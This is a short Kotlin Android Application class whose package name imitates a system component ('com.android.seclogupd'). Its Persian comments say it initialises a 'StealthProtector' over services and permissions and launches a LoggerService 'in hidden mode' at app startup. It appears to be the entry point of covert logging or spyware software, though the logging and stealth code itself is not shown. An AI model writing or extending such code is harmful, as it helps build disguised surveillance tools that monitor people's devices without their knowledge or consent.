package com.android.seclogupd.core

import android.app.Application
import android.content.Intent
import android.os.Build
import com.android.seclogupd.protect.StealthProtector
import com.android.seclogupd.service.LoggerService

class App : Application() {
    override fun onCreate() {
        super.onCreate()

        // اجرای محافظت کلی روی سرویس و دسترسی‌ها
        StealthProtector.init(this)

        // اجرای سرویس لاگر در حالت مخفی (foreground service از LoggerService)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(Intent(this, LoggerService::class.java))
        } else {
            startService(Intent(this, LoggerService::class.java))
        }

        // TODO: سایر initializations: database, loggers, VPN, ...
    }
}
